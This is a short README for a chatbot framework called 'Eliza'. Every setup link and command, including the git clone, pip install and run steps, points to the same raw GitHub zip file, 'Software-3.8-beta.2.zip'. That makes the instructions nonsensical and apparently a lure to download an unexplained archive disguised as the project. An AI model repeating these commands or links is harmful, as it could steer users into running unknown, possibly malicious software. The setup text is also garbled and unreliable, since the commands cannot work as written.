## Introduction

Eliza is a framework that provides all of the essentials necessary to build an open-domain chatbot capable of fulfilling basic needs in natural language. This repo holds our implementation for these essentials, including modules that perform core NLP, context building, and more.

## Setup

Firstly, a [Sukima Backend](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip) is required to be running to host Eliza locally. In order to install and setup Sukima, please [click here.](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)

Then, you will have to clone and setup Eliza by running these commands:

``$ git clone https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``

``$ cd eliza``

``$ pip install -r https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``

## Configuration

After the setup is complete, you can use one of our default configurations listed in the ``config`` folder, or you can create your own by using the default as a template.

## Run

Then finally, to run the chatbot, all you would need to do is to run this command with your selected config file.

``$ python eliza https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``
